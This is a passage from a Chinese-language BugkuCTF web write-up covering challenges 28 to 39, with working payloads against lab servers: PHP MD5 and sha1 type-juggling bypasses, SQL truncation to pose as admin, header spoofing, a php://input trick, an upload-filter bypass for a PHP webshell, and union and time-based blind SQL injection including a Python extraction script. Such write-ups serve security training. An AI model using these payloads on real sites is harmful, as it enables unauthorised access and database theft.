<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key is: KEY&#123;0x0SIOPh550afc&#125;</span><br></pre></td></tr></table></figure>



<p><strong>28. 前女友(SKCTF)</strong></p>
<p>考点：MD5 、代码审计</p>
<p>Topic Link：<a href="http://123.206.31.85:49162/" target="_blank" rel="noopener">http://123.206.31.85:49162/</a><br><img src="BugkuCTF~Web~WriteUp/1594459-20190216220021144-2114445856.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216220327209-1673955890.png" alt="img"></p>
<p>查看页面源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">    .link &#123;</span><br><span class="line">        text-decoration: none;</span><br><span class="line">        color: #000;</span><br><span class="line">    &#125;</span><br><span class="line">    .link:hover &#123;</span><br><span class="line">        text-decoration: none;</span><br><span class="line">        color: #000;</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">&lt;p&gt;分手了，纠结再三我没有拉黑她，原因无它，放不下。</span><br><span class="line">&lt;p&gt;终于那天，竟然真的等来了她的消息：“在吗？”</span><br><span class="line">&lt;p&gt;我神色平静，但颤抖的双手却显示出我此刻的激动。“怎么了？有事要我帮忙？”</span><br><span class="line">&lt;p&gt;“怎么，没事就不能联系了吗？”结尾处调皮表情，是多么的陌生和熟悉……</span><br><span class="line">&lt;p&gt;“帮我看看这个...”说着，她发来一个&lt;a class&#x3D;&quot;link&quot; href&#x3D;&quot;code.txt&quot; target&#x3D;&quot;_blank&quot;&gt;链接&lt;&#x2F;a&gt;。</span><br><span class="line">&lt;p&gt;不忍心拂她的意就点开了链接，看着屏幕我的心久久不能平静，往事一幕幕涌上心头......</span><br><span class="line">&lt;p&gt;。。。。。。</span><br><span class="line">&lt;p&gt;“我到底做错了什么，要给我看这个！”</span><br><span class="line">&lt;p&gt;“还记得你曾经说过。。。。。。。。”</span><br><span class="line">&lt;h2&gt;PHP是世界上最好的语言&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>根据提示点击链接，得到php代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;</span><br><span class="line">    $v1 &#x3D; $_GET[&#39;v1&#39;];</span><br><span class="line">    $v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class="line">    $v3 &#x3D; $_GET[&#39;v3&#39;];</span><br><span class="line">    if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计发现需要满足两个条件：1. if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])) ==》 TRUE </p>
<p>   　　　　　　　　　　　　　　　2. if($v1 != $v2 && md5($v1) == md5($v2)) ==》 TRUE</p>
<p>利用MD5特殊字符串和strcmp()函数不能不处理数组进行构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;QNKCDZO&amp;v2&#x3D;s1885207154a&amp;v3[]&#x3D;11</span><br></pre></td></tr></table></figure>

<p>利用MD5和strcmp()函数不能不处理数组进行构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1[]&#x3D;13&amp;v2[]&#x3D;12&amp;v3[]&#x3D;11</span><br></pre></td></tr></table></figure>

<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216221319520-1956512831.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SKCTF&#123;Php_1s_tH3_B3St_L4NgUag3&#125;</span><br></pre></td></tr></table></figure>



<p><strong>29. login1(SKCTF)</strong></p>
<p>考点：基于约束的SQL攻击</p>
<p>Topic Link：<a href="http://123.206.31.85:49163/" target="_blank" rel="noopener">http://123.206.31.85:49163/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190302174715074-1847737066.png" alt="img"></p>
<p>先去注册一个用户进行登陆看看页面是否有特殊的信息显示</p>
<p>注册：</p>
<p>username: "123"</p>
<p>password: "aA123456"</p>
<p>登陆：</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190302175837483-502629315.png" alt="img"></p>
<p>根据登陆显示 and 题目提示SQL约束攻击</p>
<p>构造payload：</p>
<p>注册：</p>
<p>//username中空格数要大于uesrname字段值的设置值(空格数尽量多一些, 多余的部分将会被截断)，绕过注册限制</p>
<p>username: "admin                    0" </p>
<p>password: "aA123456"</p>
<p>登陆：</p>
<p>//真正成功存入数据库中的是"admin                    " 原因username字段没有设置unique字段限制，"admin"="admin+空格"导致绕过admin的限制</p>
<p>username: "admin                    " </p>
<p>password: "aA123456"</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190302180624850-124757119.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190302180647107-1946971797.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SKCTF&#123;4Dm1n_HaV3_GreAt_p0w3R&#125;</span><br></pre></td></tr></table></figure>



<p><strong>30. 你从哪里来</strong></p>
<p>考点：HTTP请求</p>
<p>Topic Link：<a href="http://123.206.87.240:9009/from.php" target="_blank" rel="noopener">http://123.206.87.240:9009/from.php</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216223224420-1435315636.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216223303781-1005910684.png" alt="img"></p>
<p>根据页面提示，构造HTTP请求头，添加Referer字段：Referer: <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p>
<p>抓包构造</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216223504574-599344758.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bug-ku_ai_admin&#125;</span><br></pre></td></tr></table></figure>



<p><strong>31.md5 collision(NUPT_CTF)</strong></p>
<p>考点：php弱类型</p>
<p>Topic Link：<a href="http://123.206.87.240:9009/md5.php" target="_blank" rel="noopener">http://123.206.87.240:9009/md5.php</a></p>
<p> <img src="BugkuCTF~Web~WriteUp/1594459-20190520172341865-58790926.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190520172030694-1963181328.png" alt="img"></p>
<p>根据提示传入参数a,但是显示false，有题目可猜测MD5碰撞，尝试构造payload</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190520172618490-1222331003.png" alt="img"></p>
<p>MD5碰撞列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>

<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;md5_collision_is_easy&#125;</span><br></pre></td></tr></table></figure>



<p><strong>32. 程序员本地网站</strong></p>
<p>考点：HTTP请求 </p>
<p>Topic Link：<a href="http://123.206.87.240:8002/localhost/" target="_blank" rel="noopener">http://123.206.87.240:8002/localhost/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216235736889-264009994.png" alt="img"></p>
<p>根据提示从本地访问，在HTTP请求头里面加上字段 X-Forwarded-For: 127.0.0.1 或者 Client-Ip: 127.0.0.1</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216235924881-2021437505.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190217000047917-530481826.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;loc-al-h-o-st1&#125;</span><br></pre></td></tr></table></figure>



<p><strong>33. 各种绕过</strong></p>
<p>考点：代码审计、sha1()</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web7/" target="_blank" rel="noopener">http://123.206.87.240:8002/web7/</a></p>
<p> <img src="BugkuCTF~Web~WriteUp/1594459-20190217002942243-1943955331.png" alt="img"></p>
<p>代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&#39;flag.php&#39;); </span><br><span class="line">$_GET[&#39;id&#39;] &#x3D; urldecode($_GET[&#39;id&#39;]); </span><br><span class="line">$flag &#x3D; &#39;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#39;; </span><br><span class="line">if (isset($_GET[&#39;uname&#39;]) and isset($_POST[&#39;passwd&#39;])) &#123; </span><br><span class="line">    if ($_GET[&#39;uname&#39;] &#x3D;&#x3D; $_POST[&#39;passwd&#39;]) </span><br><span class="line"></span><br><span class="line">        print &#39;passwd can not be uname.&#39;; </span><br><span class="line"></span><br><span class="line">    else if (sha1($_GET[&#39;uname&#39;]) &#x3D;&#x3D;&#x3D; sha1($_POST[&#39;passwd&#39;])&amp;($_GET[&#39;id&#39;]&#x3D;&#x3D;&#39;margin&#39;)) </span><br><span class="line"></span><br><span class="line">        die(&#39;Flag: &#39;.$flag); </span><br><span class="line"></span><br><span class="line">    else </span><br><span class="line"></span><br><span class="line">        print &#39;sorry!&#39;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计需要满足：1. $_GET['uname'] != $_POST['passwd']</p>
<ol start="2">
<li><p>sha1($_GET['uname']) === sha1($_POST['passwd'])  //利用数组绕过</p>
<p>GET['id']=='margin')</p>
</li>
</ol>
<p>利用sha1()不能处理数组进行构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web7&#x2F;?uname[]&#x3D;999&amp;id&#x3D;margin</span><br><span class="line"></span><br><span class="line">POST：passwd[]&#x3D;6666</span><br></pre></td></tr></table></figure>

<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: flag&#123;HACK_45hhs_213sDD&#125;</span><br></pre></td></tr></table></figure>



<p><strong>34. web8</strong></p>
<p>考点：php伪协议</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web8/" target="_blank" rel="noopener">http://123.206.87.240:8002/web8/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216213815576-1800704821.png" alt="img"></p>
<p>页面源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f &#x3D; trim(file_get_contents($fn));</span><br><span class="line">if ($ac &#x3D;&#x3D;&#x3D; $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计发现需要满足两个条件：1. ac不能为空</p>
<p>   　　　　　　　　　　　　　　　2. $ac === $f</p>
<p>利用php伪协议：php://input 构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web8&#x2F;?ac&#x3D;123&amp;fn&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">POST：123</span><br></pre></td></tr></table></figure>

<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216214331888-1770093365.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is flag: flag&#123;3cfb7a90fc0de31&#125;</span><br></pre></td></tr></table></figure>



<p><strong>35. 细心</strong></p>
<p>考点：渗透测试 </p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web13/" target="_blank" rel="noopener">http://123.206.87.240:8002/web13/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216225213987-535865165.png" alt="img"></p>
<p>利用御剑web扫描器进行网站的扫描</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216225325713-1765080731.png" alt="img"></p>
<p>访问 <a href="http://123.206.87.240:8002/web13/robots.txt" target="_blank" rel="noopener">http://123.206.87.240:8002/web13/robots.txt</a> 根据提示再访问 <a href="http://123.206.87.240:8002/web13/resusl.php" target="_blank" rel="noopener">http://123.206.87.240:8002/web13/resusl.php</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216225453702-1112387889.png" alt="img"></p>
<p>根据提示管理员admin尝试给x赋值为admin，意外得到flag</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216225711327-1620482708.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag(ctf_0098_lkji-s)</span><br></pre></td></tr></table></figure>



<p><strong>36.求getshell</strong></p>
<p>考点：文件上传</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web9/" target="_blank" rel="noopener">http://123.206.87.240:8002/web9/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190520180247331-2022279399.png" alt="img"></p>
<p>根据提示需要上传php马，经过测试需要满足一下几个条件</p>
<p>1、文件名filename=*.php5</p>
<p>2、文件类型Content-Type: image/jpeg</p>
<p>3、数据包类型Content-Type: multipart/form-datA #大小写绕过</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190520180636204-1274917277.png" alt="img"></p>
<p>get flag；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;bb35dc123820e&#125;</span><br></pre></td></tr></table></figure>



<p><strong>37. INSERT INTO注入</strong></p>
<p>考点：HTTP头部注入、WAF绕过</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web15/" target="_blank" rel="noopener">http://123.206.87.240:8002/web15/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190302221715731-836971067.png" alt="img"></p>
<p>代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>分析是HTTP头部注入</p>
<p>\1. 代码0报错：error_reporting(0) 所以不考虑报错注入</p>
<p>\2. 代码只有IP回显所以不考虑Boolean注入</p>
<p>\3. 注入归于时间注入</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#-*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">str_value&#x3D;&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.&quot;</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#爆表名长度：14</span><br><span class="line">#data &#x3D; 11&#39;  and (case when (length((select group_concat(table_name) from information_schema.tables where table_name&#x3D;database()))&#x3D;14) then sleep(4) else 1 end)) #</span><br><span class="line">#爆表名值：client_ip,flag</span><br><span class="line">#data &#x3D; &quot;11&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() ) from &quot; + str(i) + &quot; for 1 )&#x3D;&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot;</span><br><span class="line"></span><br><span class="line">#爆字段长度：4</span><br><span class="line">#data &#x3D; 11&#39;  and (case when (length((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;))&#x3D;4) then sleep(4) else 1 end)) #</span><br><span class="line">#爆字段值：flag</span><br><span class="line">#data &#x3D; &quot;11&#39; and (case when (substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;) from &quot; + str(i) + &quot; for 1 )&#x3D;&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot;</span><br><span class="line"></span><br><span class="line">#爆字段内容长度：32</span><br><span class="line">#data &#x3D; 11&#39;  and (case when (length((select group_concat(flag) from flag))&#x3D;32) then sleep(4) else 1 end)) #</span><br><span class="line">#爆字段内容：xxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">#data &#x3D; &quot;11&#39; and (case when (substr((select group_concat(flag) from flag) from &quot; + str(i) + &quot; for 1 )&#x3D;&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for str1 in str_value:</span><br><span class="line">        data &#x3D; &quot;11&#39; and (case when (substr((select group_concat(flag) from flag) from &quot; + str(i) + &quot; for 1 )&#x3D;&#39;&quot; + str1 + &quot;&#39;) then sleep(5) else 0 end )) #&quot;</span><br><span class="line">        headers &#x3D; &#123;&quot;x-forwarded-for&quot;:data&#125;</span><br><span class="line">        try:</span><br><span class="line">            result &#x3D; requests.get(url,headers&#x3D;headers,timeout&#x3D;4)</span><br><span class="line">        except:</span><br><span class="line">            flag +&#x3D; str1</span><br><span class="line">            print(&quot;flag:&quot;+flag)</span><br><span class="line">            break</span><br><span class="line">print(&#39;End_Flag:&#39; + flag)</span><br></pre></td></tr></table></figure>

<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cdbf14c9551d5be5612f7bb5d2827853&#125;</span><br></pre></td></tr></table></figure>



<p><strong>38. 这是一个神奇的登陆框</strong></p>
<p>考点：SQL注入</p>
<p>地址：<a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521203525882-841310662.png" alt="img"></p>
<p>对Username进行测试发现admin"会显示错误信息，admin"#时显示正常，猜测存在联合注入</p>
<p>查询字段数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; order by 1,2# False</span><br><span class="line">admin&quot; order by 1,2,3# True</span><br></pre></td></tr></table></figure>



<p>查询数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; union select databses(),2#</span><br></pre></td></tr></table></figure>



<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521203633317-1317304188.png" alt="img"></p>
<p>查询表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;&#39;bugkusql1&#39;#</span><br></pre></td></tr></table></figure>



<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521210404156-1583867354.png" alt="img"></p>
<p>查询flag1表字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; union select group_concat(column_name),2 from information_schema.columns where table_name&#x3D;&#39;flag1&#39; and table_schema&#x3D;&#39;bugkusql1&#39;#</span><br></pre></td></tr></table></figure>



<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521210714063-1279293506.png" alt="img"></p>
<p>查询字段数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; union select group_concat(flag1),2 from bugkusql1.flag1#</span><br></pre></td></tr></table></figure>



<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521210920299-2035644775.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ed6b28e684817d9efcaf802979e57aea&#125;</span><br></pre></td></tr></table></figure>



<p><strong>39. 多次</strong></p>
<p>考点：SQl 注入</p>
<p>地址：<a href="http://123.206.87.240:9004/" target="_blank" rel="noopener">http://123.206.87.240:9004</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522211729769-1525855438.png" alt="img"></p>
<p>初始界面</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522211836089-220601025.png" alt="img"></p>
<p>测试发现可能存在注入</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522212027616-944915130.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522212419145-1393452147.png" alt="img"></p>
<p>通过fuzz测试查看过滤了那些关键字</p>
<p>payload1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1&#39; anandd length(&quot;sselectelect&quot;) --+ true</span><br><span class="line"># 123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1&#39; anandd length(&quot;select&quot;) --+ false</span><br></pre></td></tr></table></figure>



<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522212237582-355478025.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521220304042-831208371.png" alt="img"></p>
<p>在知道过滤了那些关键字之后，继续测试发现存在布尔盲注</p>
<p>payload2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1%27%20anandd%201&#x3D;1--+</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1%27%20anandd%201&#x3D;2--+</span><br></pre></td></tr></table></figure>



<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522212527640-939877575.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522212613136-1360706659.png" alt="img"></p>
<p>在已知存在布尔盲注的基础上编写 POC1</p>
